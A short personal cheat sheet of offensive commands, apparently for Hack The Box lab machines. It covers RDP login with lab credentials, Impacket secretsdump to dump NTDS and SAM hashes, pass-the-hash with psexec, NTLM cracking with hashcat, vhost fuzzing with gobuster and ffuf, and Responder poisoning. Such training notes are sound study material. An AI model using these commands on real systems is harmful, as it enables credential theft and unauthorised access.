Below are just examples of how to execute each of the commands that I would normally use.
# XfreeRDP
```
xfreerdp /v:10.129.43.43 /u:htb-student /p:'HTB_@cademy_stdnt!' /drive:linux,/home/p3ta/ /dynamic-resolution
```
# Impacket
Secretsdump
```
impacket-secretsdump server_adm@10.129.43.42 -just-dc-user administrator
```
```
impacket-secretsdump local -system SYSTEM -ntds ntds.dit 
```
```
impacket-secretsdump local -system registry/SYSTEM -ntds Active\ Directory/ntds.dit
```
```
impacket-secretsdump local -system SYSTEM -sam SAM
```

PSexec
```
impacket-psexec administrator@10.129.43.42 -hashes :7796ee39fd3a9c3a1844556115ae1a54
```
# Hashcat
NTLM
```
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
```
# Gobuster
VHOST
```
gobuster vhost -u mailroom.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```
# FFUF
VHOST
```
sudo ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://mailroom.htb/ -H "Host: FUZZ.mailroom.htb" -fs 7748
```
# Responder
Location: /tools/responder
```
sudo ./Responder.py -wrf -v -I tun0
```
